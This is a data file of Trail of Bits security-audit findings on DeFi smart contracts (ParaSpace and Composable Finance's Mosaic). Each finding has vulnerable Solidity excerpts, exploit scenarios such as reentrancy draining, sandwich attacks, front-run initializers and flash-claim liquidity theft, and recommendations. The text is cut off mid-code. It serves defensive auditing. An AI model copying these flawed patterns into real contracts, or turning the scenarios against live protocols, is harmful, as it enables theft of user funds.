        "body": "The PriceOracleSentinel contracts isBorrowAllowed and isLiquidationAllowed functions return true only if a grace period has elapsed since the oracles last update. Setting the grace period parameter too high could result in a denial-of-service condition. The relevant code appears in gure 8.1. Both isBorrowAllowed and isLiquidationAllowed call _isUpAndGracePeriodPassed, which checks whether block.timestamp minus lastUpdateTimestamp is greater than _gracePeriod. /// @inheritdoc IPriceOracleSentinel function isBorrowAllowed() external view override returns (bool) { return _isUpAndGracePeriodPassed(); } /// @inheritdoc IPriceOracleSentinel function isLiquidationAllowed() external view override returns (bool) { return _isUpAndGracePeriodPassed(); } /** * @notice Checks the sequencer oracle is healthy: is up and grace period passed. * @return True if the SequencerOracle is up and the grace period passed, false otherwise */ function _isUpAndGracePeriodPassed() internal view returns (bool) { (, int256 answer, , uint256 lastUpdateTimestamp, ) = _sequencerOracle .latestRoundData(); return answer == 0 && block.timestamp - lastUpdateTimestamp > _gracePeriod; } Figure 8.1: contracts/protocol/configuration/PriceOracleSentinel.sol#L69L88 Suppose block.timestamp minus lastUpdateTimestamp is never more than N seconds. Consequently, setting _gracePeriod to N or greater would mean that isBorrowAllowed and isLiquidationAllowed never return true. The code in gure 8.1 resembles some example code from the Chainlink documentation. However, in that example code, the grace period is relative to when the round started, not when the round was updated. Exploit Scenario Alice, a Paraspace administrator, accidentally sets the grace period to higher than the interval at which rounds are updated. Borrowing and liquidation operations are eectively disabled as a result. Recommendations Short term, either have the grace period start from a rounds startedAt time, or consider removing the grace period entirely. Doing so will eliminate a potential denial-of-service condition. Long term, monitor Chainlink oracles behavior to determine long-term trends. Doing so will help in determining safe parameter choices.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Incorrect accounting in _transferCollaterizable ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "The _transferCollaterizable function mishandles the collaterizedBalance and _isUsedAsCollateral elds. At a minimum, this means that transferred tokens cannot be used as collateral. The code for _transferCollaterizable appears in gure 9.1. It is called from Ntoken._transfer (gure 9.2). The code decreases _userState[from].collaterizedBalance and clears _isUsedAsCollateral[tokenId]. However, the code does not make any corresponding changes, such as increasing _userState[to].collaterizedBalance and setting _isUsedAsCollateral[tokenId] elsewhere. As a result, if Alice transfers her NToken to Bob, Bob will not be able to use the corresponding ERC721 token as collateral. function _transferCollaterizable( address from, address to, uint256 tokenId ) internal virtual returns (bool isUsedAsCollateral_) { isUsedAsCollateral_ = _isUsedAsCollateral[tokenId]; if (from != to && isUsedAsCollateral_) { _userState[from].collaterizedBalance -= 1; delete _isUsedAsCollateral[tokenId]; } MintableIncentivizedERC721._transfer(from, to, tokenId); } Figure 9.1: contracts/protocol/tokenization/base/MintableIncentivizedERC721.sol#L643 L656 function _transfer( address from, address to, uint256 tokenId, bool validate ) internal { address underlyingAsset = _underlyingAsset; uint256 fromBalanceBefore = collaterizedBalanceOf(from); uint256 toBalanceBefore = collaterizedBalanceOf(to); bool isUsedAsCollateral = _transferCollaterizable(from, to, tokenId); ... } Figure 9.2: contracts/protocol/tokenization/NToken.sol#L300L324 The code used to verify the bug appears in gure 9.3. The code rst veries that the collaterizedBalance and _isUsedAsCollateral elds are set correctly. It then has User 1 send his or her token to User 2, who sends it back to User 1. Finally, it veries that the collaterizedBalance and _isUsedAsCollateral elds are set incorrectly. Most subsequent tests fail thereafter. it(\"User 1 sends the nToken to User 2, who sends it back to User 1\", async () => { const { nBAYC, users: [user1, user2], } = testEnv; expect(await nBAYC.isUsedAsCollateral(0)).to.be.equal(true); expect(await nBAYC.collaterizedBalanceOf(user1.address)).to.be.equal(1); expect(await nBAYC.collaterizedBalanceOf(user2.address)).to.be.equal(0); await nBAYC.connect(user1.signer).transferFrom(user1.address, user2.address, 0); await nBAYC.connect(user2.signer).transferFrom(user2.address, user1.address, 0); expect(await nBAYC.isUsedAsCollateral(0)).to.be.equal(false); expect(await nBAYC.collaterizedBalanceOf(user1.address)).to.be.equal(0); expect(await nBAYC.collaterizedBalanceOf(user2.address)).to.be.equal(0); }); it(\"User 2 deposits 10k DAI and User 1 borrows 8K DAI\", async () => { Figure 9.3: This is the code used to verify the bug. The highlighted line appears in the ntoken.spec.ts le. What precedes it was added to that le. Exploit Scenario Alice, a Paraspace user, maintains several accounts. Alice transfers an NToken from one of her accounts to another. She tries to borrow against the NTokens corresponding ERC721 token but is unable to. Alice misses a nancial opportunity while trying to determine the source of the error. Recommendations Short term, implement one of the following two options:  Correct the accounting errors in the code in gure 9.1. (We experimented with this but were not able to determine all of the necessary changes.) Correcting the accounting errors will help ensure that users observe predictable behavior regarding NTokens.  Disallow the transferring of assets that have been registered as collateral. If a user is to be surprised by her NTokens behavior, it is better that it happen sooner (when the user tries to transfer) than later (when the user tries to borrow). Long term, expand the tests in ntoken.spec.ts to include scenarios such as transferring NTokens among users. Including such tests could help to uncover similar bugs. Note that ntoken.spec.ts includes at least one broken test (gure 9.3). The token ID passed to nBAYC.transferFrom should be 0, not 1. Furthermore, the test checks for the wrong error message. It should be Health factor is lesser than the liquidation threshold, not ERC721: operator query for nonexistent token. it(\"User 1 tries to send the nToken to User 2 (should fail)\", async () => { const { nBAYC, users: [user1, user2], } = testEnv; await expect( nBAYC.connect(user1.signer).transferFrom(user1.address, user2.address, 1) ).to.be.revertedWith(\"ERC721: operator query for nonexistent token\"); }); Figure 9.4: test-suites/ntoken.spec.ts#L74L83",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. IPriceOracle interface is used only in tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "The IPriceOracle interface is used only in tests, yet it appears alongside production code. Its location increases the risk that a developer will try to use it in production code. The complete interface appears in gure 10.1. Note that the interface includes code that a real oracle is unlikely to include, such as the setAssetPrice function. Therefore, a developer that calls this function would likely introduce a bug into the code. // SPDX-License-Identifier: AGPL-3.0 pragma solidity 0.8.10; /** * @title IPriceOracle * * @notice Defines the basic interface for a Price oracle. **/ interface IPriceOracle { /** * @notice Returns the asset price in the base currency * @param asset The address of the asset * @return The price of the asset **/ function getAssetPrice(address asset) external view returns (uint256); /** * @notice Set the price of the asset * @param asset The address of the asset * @param price The price of the asset **/ function setAssetPrice(address asset, uint256 price) external; } Figure 10.1: contracts/interfaces/IPriceOracle.sol Exploit Scenario Alice, a Paraspace developer, uses the IPriceOracle interface in production code. Alices contract tries to call the setAssetPrice method. When the vulnerable code path is exercised, Alices contract reverts unexpectedly. Recommendations Short term, move IPriceOracle.sol to a location that makes it clear that it should be used in testing code only. Adjust all references to the le accordingly. Doing so will reduce the risk that the le is used in production code. Long term, as new code is added to the codebase, maintain segregation between production and testing code. Testing code is typically not held to the same standards as production code. Calling testing code from production code could introduce bugs.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Manual ERC721 transfers could be claimed as NTokens by anyone ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "The PoolCore contract has an external function supplyERC721FromNToken, whose purpose is to validate that the given ERC721 assets are owned by the NToken contract and then to mint the corresponding NTokens to a caller-supplied address. We suspect that the intended use case for this function is that the NTokenMoonBirds or UniswapV3Gateway contract will transfer the ERC721 assets to the NToken contract and then immediately call supplyERC721FromNToken. However, the access controls on this function allow an unauthorized user to take ownership of any assets manually transferred to the NToken contract, for whatever reason that may be, as NToken does not track the original owner of the asset. function supplyERC721FromNToken( address asset, DataTypes.ERC721SupplyParams[] calldata tokenData, address onBehalfOf ) external virtual override nonReentrant { SupplyLogic.executeSupplyERC721FromNToken( // ... ); } Figure 11.1: The external supplyERC721FromNToken function within PoolCore function validateSupplyFromNToken( DataTypes.ReserveCache memory reserveCache, DataTypes.ExecuteSupplyERC721Params memory params, DataTypes.AssetType assetType ) internal view { // ... for (uint256 index = 0; index < amount; index++) { // validate that the owner of the underlying asset is the NToken contract require( IERC721(params.asset).ownerOf( params.tokenData[index].tokenId ) == reserveCache.xTokenAddress, Errors.NOT_THE_OWNER ); // validate that the owner of the ntoken that has the same tokenId is the zero address require( IERC721(reserveCache.xTokenAddress).ownerOf( params.tokenData[index].tokenId ) == address(0x0), Errors.NOT_THE_OWNER ); } } Figure 11.2: The validation checks performed by supplyERC721FromNToken function executeSupplyERC721Base( uint16 reserveId, address nTokenAddress, DataTypes.UserConfigurationMap storage userConfig, DataTypes.ExecuteSupplyERC721Params memory params ) internal { // ... bool isFirstCollaterarized = INToken(nTokenAddress).mint( params.onBehalfOf, params.tokenData ); // ... } Figure 11.3: The unauthorized minting operation Users regularly interact with the NToken contract, which represents ERC721 assets, so it is possible that a malicious actor could convince users to transfer their ERC721 assets to the contract in an unintended manner. Exploit Scenario Alice, an unaware owner of some ERC721 assets, is convinced to transfer her assets to the NToken contract (or transfers them on her own accord, unaware that she should not). A malicious third party mints NTokens from Alices assets and withdraws them to his own account. Recommendations Short term, document the purpose and use of the NToken contract to ensure that users are unambiguously aware that ERC721 tokens are not meant to be sent directly to the NToken contract. Long term, consider whether supplyERC721FromNToken should have more access controls around it. Additional access controls could prevent attackers from taking ownership of any incorrectly transferred asset. In particular, this function is called from only two locations, so a msg.sender whitelist could be sucient. Additionally, if possible, consider adding additional metadata to the contract to track the original owner of ERC721 assets, and consider providing a mechanism for transferring any asset without a corresponding NToken back to the original owner.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Inconsistent behavior between NToken and PToken liquidations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "When a user liquidates another users ERC20 tokens and opts to receive PTokens, the PTokens are automatically registered as collateral. However, when a user liquidates another users ERC721 token and opts to receive an NToken, the NToken is not automatically registered as collateral. This discrepancy could be confusing for users. The relevant code appears in gures 12.1 through 12.3. For ERC20 tokens, _liquidatePTokens is called, which in turns calls setUsingAsCollateral if the liquidator has not already designated the PTokens as collateral (gures 12.1 and 12.2). However, for an ERC721 token, the NToken is simply transferred (gure 12.3). if (params.receiveXToken) { _liquidatePTokens(usersConfig, collateralReserve, params, vars); } else { Figure 12.1: contracts/protocol/libraries/logic/LiquidationLogic.sol#L310L312 function _liquidatePTokens( mapping(address => DataTypes.UserConfigurationMap) storage usersConfig, DataTypes.ReserveData storage collateralReserve, DataTypes.ExecuteLiquidationCallParams memory params, LiquidationCallLocalVars memory vars ) internal { ... if (liquidatorPreviousPTokenBalance == 0) { DataTypes.UserConfigurationMap storage liquidatorConfig = usersConfig[vars.liquidator]; liquidatorConfig.setUsingAsCollateral(collateralReserve.id, true); emit ReserveUsedAsCollateralEnabled( params.collateralAsset, vars.liquidator ); } } Figure 12.2: contracts/protocol/libraries/logic/LiquidationLogic.sol#L667L693 if (params.receiveXToken) { INToken(vars.collateralXToken).transferOnLiquidation( params.user, vars.liquidator, params.collateralTokenId ); } else { Figure 12.3: contracts/protocol/libraries/logic/LiquidationLogic.sol#L562L568 Exploit Scenario Alice, a Paraspace user, liquidates several ERC721 tokens. Alice comes to expect that received NTokens are not designated as collateral. Eventually, Alice liquidates another users ERC20 tokens and opts to receive PTokens. Bob liquidates Alices PTokens, and Alice loses the underlying ERC20 tokens as a result. Recommendations Short term, conspicuously document the fact that PToken and NToken liquidations behave dierently. Doing so will reduce the likelihood that users will be surprised by the inconsistency. Long term, consider whether the behavior should be made consistent. That is, decide whether NTokens and PTokens should be automatically collateralized on liquidation, and implement such behavior for both types of tokens. A consistent API is less likely to be a source of errors.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Missing asset type checks in ValidationLogic library ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "Some validation functions involving assets do not check the given assets type. Such checks should be added to ensure defense in depth. The validateRepay function is one example (gure 13.1). The function performs several checks involving the asset being repaid, but the function does not check that the asset is an ERC20 asset. function validateRepay( DataTypes.ReserveCache memory reserveCache, uint256 amountSent, DataTypes.InterestRateMode interestRateMode, address onBehalfOf, uint256 stableDebt, uint256 variableDebt ) internal view { ... (bool isActive, , , , bool isPaused, ) = reserveCache .reserveConfiguration .getFlags(); require(isActive, Errors.RESERVE_INACTIVE); require(!isPaused, Errors.RESERVE_PAUSED); ... } Figure 13.1: contracts/protocol/libraries/logic/ValidationLogic.sol#L403L447 Another example is the validateFlashloanSimple function, which does not check that the loaned asset is an ERC20 asset. We do not believe that the absence of these checks currently represents a vulnerability. However, adding these checks will help protect the code against future modications. Exploit Scenario Alice, a Paraspace developer, implements a feature allowing users to ash loan ERC721 tokens to other users in exchange for a fee. Alice uses the validateFlashloanSimple function as a template for implementing the new validation code. Therefore, Alices additions lack a check that the loaned assets are actually ERC721 assets. Some users lose ERC20 tokens as a result. Recommendations Short term, ensure that each validation function involving assets veries the type of the asset involved. Doing so will help protect the code against future modications. Long term, regularly review all conditionals involving asset types to verify that they handle all applicable asset types correctly. Doing so will help to identify problems involving the handling of dierent asset types.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Uniswap v3 NFT ash claims may lead to undercollateralization ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "Flash claims enable users with collateralized NFTs to assume ownership of the underlying asset for the duration of a single transaction, with the condition that the NFT be returned at the end of the transaction. When used with typical NFTs, such as Bored Ape Yacht Club tokens, the atomic nature of ash claims prevents users from removing net value from the Paraspace contract while enabling them to claim rewards, such as airdrops, that they are entitled to by virtue of owning the NFTs. Uniswap v3 NFTs represent a position in a Uniswap liquidity pool and entitle the owner to add or withdraw liquidity from the underlying Uniswap position. Uniswap v3 NFT prices are determined by summing the value of the two ERC20 tokens deposited as liquidity in the underlying position. Normally, when a Uniswap NFT is deposited in the Uniswap NToken contract, the user can withdraw liquidity only if the resulting price leaves the users health factor above one. However, by leveraging the ash claim system, a user could claim the Uniswap v3 NFT temporarily and withdraw liquidity directly, returning a valueless NFT. As currently implemented, Paraspace is not vulnerable to this attack because Uniswap v3 ash claims are, apparently accidentally, nonfunctional. A check in the onERC721Recieved function of the NTokenUniswapV3 contract, which is designed to prevent users from depositing Uniswap positions via the supplyERC721 method, incidentally prevents Uniswap NFTs from being returned to the contract during the ash claim process. However, this check could be removed in future updates and occurs at the very last step in what would otherwise be a successful exploit. function onERC721Received( address operator, address, uint256 id, bytes memory ) external virtual override returns (bytes4) { // ... // if the operator is the pool, this means that the pool is transferring the token to this contract // which can happen during a normal supplyERC721 pool tx if (operator == address(POOL)) { revert(Errors.OPERATION_NOT_SUPPORTED); } Figure 14.1: The failing check that prevents the completion of Uniswap v3 ash claims Exploit Scenario Alice, a Paraspace developer, decides to move the check that prevents users from depositing Uniswap v3 NFTs via the supplyERC721 method out of the onERC721Received function and into the Paraspace Pool contract. She thus unwittingly enables ash claims for Uniswap v3 positions. Bob, a malicious actor, then deposits a Uniswap NFT worth 100 ETH and borrows 30 ETH against it. Bob ash claims the NFT and withdraws the 100 ETH of liquidity, leaving a worthless NFT as collateral and taking the 30 ETH as prot. Recommendations Short term, disable Uniswap v3 NFT ash claims explicitly by requiring in ValidationLogic.validateFlashClaim that the ash claimed NFT not be atomically priced. Long term, consider adding a user healthFactor check after the return phase of the ash claim process to ensure that users cannot become undercollateralized as a result of ash claims.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Non-injective hash encoding in getClaimKeyHash ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "body": "As part of the ash claim functionality, Paraspace provides an implementation of a contract that can claim airdrops on behalf of NFT holders. This contract tracks claimed airdrops in the airdropClaimRecords mapping, indexed by the result of the getClaimKeyHash function. However, it is possible for two dierent inputs to getClaimKeyHash to result in identical hashes through a collision in the unpacked encoding. Because nftTokenIds and params are both variable-length inputs, an input with nftTokenIds equal to uint256(1) and an empty params will hash to the same value as an input with an empty nftTokenIds and params equal to uint256(1). Although the airdropClaimRecords mapping is not read or otherwise referenced elsewhere in the code, collisions may cause o-chain clients to mistakenly believe that an unclaimed airdrop has already been claimed. function getClaimKeyHash( address initiator, address nftAsset, uint256[] calldata nftTokenIds, bytes calldata params ) public pure returns (bytes32) { return keccak256( abi.encodePacked(initiator, nftAsset, nftTokenIds, params) ); } Figure 15.1: contracts/misc/flashclaim/AirdropFlashClaimReceiver.sol#L247257 Exploit Scenario Paraspace develops an o-chain tool to help users automatically claim airdrops for their NFTs. By chance or through malfeasance, two dierent airdrop claim operations for the same nftAsset result in the same claimKeyHash. The tool then mistakenly believes that it has claimed both airdrops when, in reality, it claimed only one. Recommendations Short term, encode the input to keccak256 using abi.encode in order to preserve boundaries between inputs. Long term, consider using an EIP-712 compatible structured hash encoding with domain separation wherever hashes will be used as unique identiers or signed messages.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Initialization functions can be front-run ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The CrosslayerPortal contracts have initializer functions that can be front-run, allowing an attacker to incorrectly initialize the contracts. Due to the use of the delegatecall proxy pattern, these contracts cannot be initialized with their own constructors, and they have initializer functions: function initialize() public initializer { __Ownable_init(); __Pausable_init(); __ReentrancyGuard_init(); } Figure 1.1: The initialize function in MsgSender:126-130 An attacker could front-run these functions and initialize the contracts with malicious values. This issue aects the following system contracts:  contracts/core/BridgeAggregator  contracts/core/InvestmentStrategyBase  contracts/core/MosaicHolding  contracts/core/MosaicVault  contracts/core/MosaicVaultConfig  contracts/core/functionCalls/MsgReceiverFactory  contracts/core/functionCalls/MsgSender  contracts/nfts/Summoner  contracts/protocols/aave/AaveInvestmentStrategy  contracts/protocols/balancer/BalancerV1Wrapper  contracts/protocols/balancer/BalancerVaultV2Wrapper  contracts/protocols/bancor/BancorWrapper  contracts/protocols/compound/CompoundInvestmentStrategy  contracts/protocols/curve/CurveWrapper  contracts/protocols/gmx/GmxWrapper  contracts/protocols/sushiswap/SushiswapLiquidityProvider  contracts/protocols/synapse/ISynapseSwap  contracts/protocols/synapse/SynapseWrapper  contracts/protocols/uniswap/IUniswapV2Pair  contracts/protocols/uniswap/UniswapV2Wrapper  contracts/protocols/uniswap/UniswapWrapper Exploit Scenario Bob deploys the MsgSender contract. Eve front-runs the contracts initialization and sets her own address as the owner address. As a result, she can use the initialize function to update the contracts variables, modifying the system parameters. Recommendations Short term, to prevent front-running of the initializer functions, use hardhat-deploy to initialize the contracts or replace the functions with constructors. Alternatively, create a deployment script that will emit sucient errors when an initialize call fails. Long term, carefully review the Solidity documentation, especially the Warnings section, as well as the pitfalls of using the delegatecall proxy pattern.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Trades are vulnerable to sandwich attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The swapToNative function does not allow users to specify the minAmountOut parameter of swapExactTokensForETH , which indicates the minimum amount of ETH that a user will receive from a trade. Instead, the value is hard-coded to zero, meaning that there is no guarantee that users will receive any ETH in exchange for their tokens. By using a bot to sandwich a users trade, an attacker could increase the slippage incurred by the user and prot o of the spread at the users expense. The minAmountOut parameter is meant to prevent the execution of trades through illiquid pools and to provide protection against sandwich attacks. The current implementation lacks protections against high slippage and may cause users to lose funds. This applies to the AVAX version, too. Composable Finance indicated that only the relayer will call this function, but the function lacks access controls to prevent users from calling it directly. Importantly, it is highly likely that if a relayer does not implement proper protections, all of its trades will suer from high slippage, as they will represent pure-prot opportunities for sandwich bots. uint256 [] memory amounts = swapRouter.swapExactTokensForETH( _amount, 0 , path, _to, deadline ); Figure 2.1: Part of the SwapToNative function in MosaicNativeSwapperETH.sol: 4450 Exploit Scenario Bob, a relayer, makes a trade on behalf of a user. The minAmountOut value is set to zero, which means that the trade can be executed at any price. As a result, when Eve sandwiches the trade with a buy and sell order, Bob sells the tokens without purchasing any, eectively giving away tokens for free. Recommendations Short term, allow users (relayers) to input a slippage tolerance, and add access controls to the swapToNative function. Long term, consider the risks of integrating with other protocols such as Uniswap and implement mitigations for those risks.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. forwardCall creates a denial-of-service attack vector ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "Low-level external calls can exhaust all available gas by returning an excessive amount of data, thereby causing the relayer to incur memory expansion costs. This can be used to cause an out-of-gas exception and is a denial-of-service (DoS) attack vector. Since arbitrary contracts can be called, Composable Finance should implement additional safeguards. If an out-of-gas exception occurs, the message will never be marked as forwarded ( forwarded[id] = true ). If the relayer repeatedly retries the transaction, assuming it will eventually be marked as forwarded, the queue of pending transactions will grow without bounds, with each unsuccessful message-forwarding attempt carrying a gas cost. The approveERC20TokenAndForwardCall function is also vulnerable to this DoS attack. (success, returnData) = _contract. call {value: msg.value }(_data); require (success, \"Failed to forward function call\" ); uint256 balance = IERC20(_feeToken).balanceOf( address ( this )); require ( balance >= _feeAmount, \"Not enough tokens for the fee\" ); forwarded[_id] = true ; Figure 3.1: Part of the forwardCall function in MsgReceiver:79-85 Exploit Scenario Eve deploys a contract that returns 10 million bytes of data. A call to that contract causes an out-of-gas exception. Since the transaction is not marked as forwarded, the relayer continues to propagate the transaction without success. This results in excessive resource consumption and a degraded quality of service. Recommendations Short term, require that the size of return data be xed to 32 bytes. Long term, review the documentation on low-level Solidity calls and EVM edge cases. References  Excessively Safe Call",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Lack of two-step process for contract ownership changes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The owner of a contract in the Composable Finance ecosystem can be changed through a call to the transferOwnership function. This function internally calls the setOwner function, which immediately sets the contracts new owner. Making such a critical change in a single step is error-prone and can lead to irrevocable mistakes. /** * @dev Leaves the contract without owner. It will not be possible to call * `onlyOwner` functions anymore. Can only be called by the current owner. * * NOTE: Renouncing ownership will leave the contract without an owner, * thereby removing any functionality that is only available to the owner. */ function renounceOwnership () public virtual onlyOwner { _setOwner( address ( 0 )); } /** * @dev Transfers ownership of the contract to a new account (`newOwner`). * Can only be called by the current owner. */ function transferOwnership ( address newOwner ) public virtual onlyOwner { require (newOwner != address ( 0 ), \"Ownable: new owner is the zero address\" ); _setOwner(newOwner); } function _setOwner ( address newOwner ) private { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); } Figure 8.1: OpenZeppelins OwnableUpgradeable contract Exploit Scenario Bob, a Composable Finance developer, invokes transferOwnership() to change the address of an existing contracts owner but accidentally enters the wrong address. As a result, he permanently loses access to the contract. Recommendations Short term, perform ownership transfers through a two-step process in which the owner proposes a new address and the transfer is completed once the new address has executed a call to accept the role. Long term, identify and document all possible actions that can be taken by privileged accounts and their associated risks. This will facilitate reviews of the codebase and prevent future mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. sendFunds is vulnerable to reentrancy by owners ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The sendFunds function is vulnerable to reentrancy and can be used by the owner of a token contract to drain the contract of its funds. Specically, because fundsTransfered[user] is written to after a call to an external contract, the contracts owner could input his or her own address and reenter the sendFunds function to drain the contracts funds. An owner could send funds to him- or herself without using the reentrancy, but there is no reason to leave this vulnerability in the code. Additionally, the FundKeeper contract can send funds to any user by calling setAmountToSend and then sendFunds . It is unclear why amountToSend is not changed (set to zero) after a successful transfer. It would make more sense to call setAmountToSend after each transfer and to store users balances in a mapping. function setAmountToSend ( uint256 amount ) external onlyOwner { amountToSend = amount; emit NewAmountToSend(amount); } function sendFunds ( address user ) external onlyOwner { require (!fundsTransfered[user], \"reward already sent\" ); require ( address ( this ).balance >= amountToSend, \"Contract balance low\" ); // solhint-disable-next-line avoid-low-level-calls ( bool sent , ) = user.call{value: amountToSend}( \"\" ); require (sent, \"Failed to send Polygon\" ); fundsTransfered[user] = true ; emit FundSent(amountToSend, user); } Figure 9.1: Part of the sendFunds function in FundKeeper.sol:23-38 Exploit Scenario Eves smart contract is the owner of the FundKeeper contract. Eves contract executes a transfer for which Eve should receive only 1 ETH. Instead, because the user address is a contract with a fallback function, Eve can reenter the sendFunds function and drain all ETH from the contract. Recommendations Short term, set fundsTransfered[user] to true prior to making external calls. Long term, store each users balance in a mapping to ensure that users cannot make withdrawals that exceed their balances. Additionally, follow the checks-eects-interactions pattern.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "20. MosaicVault and MosaicHolding owner has excessive privileges ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "The owner of the MosaicVault and MosaicHolding contracts has too many privileges across the system. Compromise of the owners private key would put the integrity of the underlying system at risk. The owner of the MosaicVault and MosaicHolding contracts can perform the following privileged operations in the context of the contracts:       Rescuing funds if the system is compromised Managing withdrawals, transfers, and fee payments Pausing and unpausing the contracts Rebalancing liquidity across chains Investing in one or more investment strategies Claiming rewards from one or more investment strategies The ability to drain funds, manage liquidity, and claim rewards creates a single point of failure. It increases the likelihood that the contracts owner will be targeted by an attacker and increases the incentives for the owner to act maliciously. Exploit Scenario Alice, the owner of MosaicVault and MosaicHolding , deploys the contracts. MosaicHolding eventually holds assets worth USD 20 million. Eve gains access to Alices machine, upgrades the implementations, pauses MosaicHolding , and drains all funds from the contract. Recommendations Short term, clearly document the functions and implementations that the owner of the MosaicVault and MosaicHolding contracts can change. Additionally, split the privileges provided to the owner across multiple roles (e.g., a fund manager, fund rescuer, owner, etc.) to ensure that no one address has excessive control over the system. Long term, develop user documentation on all risks associated with the system, including those associated with privileged users and the existence of a single point of failure.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "24. SushiswapLiquidityProvider deposits cannot be used to cover withdrawal requests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "body": "Withdrawal requests that require the removal of liquidity from a Sushiswap liquidity pool will revert and cause a system failure. When a user requests a withdrawal of liquidity from the Mosaic system, MosaicVault (via the coverWithdrawRequest() function) queries MosaicHolding to see whether liquidity must be removed from an investment strategy to cover the withdrawal amount (gure 24.1). function _withdraw ( address _accountTo , uint256 _amount , address _tokenIn , address _tokenOut , uint256 _amountOutMin , WithdrawData calldata _withdrawData, bytes calldata _data ) { internal onlyWhitelistedToken(_tokenIn) validAddress(_tokenOut) nonReentrant onlyOwnerOrRelayer whenNotPaused returns ( uint256 withdrawAmount ) IMosaicHolding mosaicHolding = IMosaicHolding(vaultConfig.getMosaicHolding()); require (hasBeenWithdrawn[_withdrawData.id] == false , \"ERR: ALREADY WITHDRAWN\" ); if (_tokenOut == _tokenIn) { require ( mosaicHolding.getTokenLiquidity(_tokenIn, _withdrawData.investmentStrategies) >= _amount, \"ERR: VAULT BAL\" ); } [...] mosaicHolding.coverWithdrawRequest( _withdrawData.investmentStrategies, _tokenIn, withdrawAmount ); [...] } Figure 24.1: The _ withdraw function in MosaicVault :40 4-474 If MosaicHolding s balance of the token being withdrawn ( _tokenIn ) is not sucient to cover the withdrawal, MosaicHolding will iterate through each investment strategy in the _investmentStrategy array and remove enough _tokenIn to cover it. To remove liquidity from an investment strategy, it calls withdrawInvestment() on that strategy (gure 24.2). function coverWithdrawRequest ( address [] calldata _investmentStrategies, address _token , uint256 _amount ) external override { require (hasRole(MOSAIC_VAULT, msg.sender ), \"ERR: PERMISSIONS A-V\" ); uint256 balance = IERC20(_token).balanceOf( address ( this )); if (balance >= _amount) return ; uint256 requiredAmount = _amount - balance; uint8 index ; while (requiredAmount > 0 ) { address strategy = _investmentStrategies[index]; IInvestmentStrategy investment = IInvestmentStrategy(strategy); uint256 investmentAmount = investment.investmentAmount(_token); uint256 amountToWithdraw = 0 ; if (investmentAmount >= requiredAmount) { amountToWithdraw = requiredAmount; requiredAmount = 0 ; } else { amountToWithdraw = investmentAmount; requiredAmount = requiredAmount - investmentAmount; } IInvestmentStrategy.Investment[] memory investments = new IInvestmentStrategy.Investment[]( 1 ); investments[ 0 ] = IInvestmentStrategy.Investment(_token, amountToWithdraw); IInvestmentStrategy(investment).withdrawInvestment(investments, \"\" ); emit InvestmentWithdrawn(strategy, msg.sender ); index++; } require (IERC20(_token).balanceOf( address ( this )) >= _amount, \"ERR: VAULT BAL\" ); } Figure 24.2: The coverWithdrawRequest function in MosaicHolding:217-251 This process works for an investment strategy in which the investments array function argument has a length of 1. However, in the case of SushiswapLiquidityProvider , the withdrawInvestment() function expects the investments array to have a length of 2 (gure 24.3). function withdrawInvestment (Investment[] calldata _investments, bytes calldata _data) external override onlyInvestor nonReentrant { Investment memory investmentA = _investments[ 0 ]; Investment memory investmentB = _investments[ 1 ]; ( uint256 deadline , uint256 liquidity ) = abi.decode(_data, ( uint256 , uint256 )); IERC20Upgradeable pair = IERC20Upgradeable(getPair(investmentA.token, investmentB.token)); pair.safeIncreaseAllowance( address (sushiSwapRouter), liquidity); ( uint256 amountA , uint256 amountB ) = sushiSwapRouter.removeLiquidity( investmentA.token, 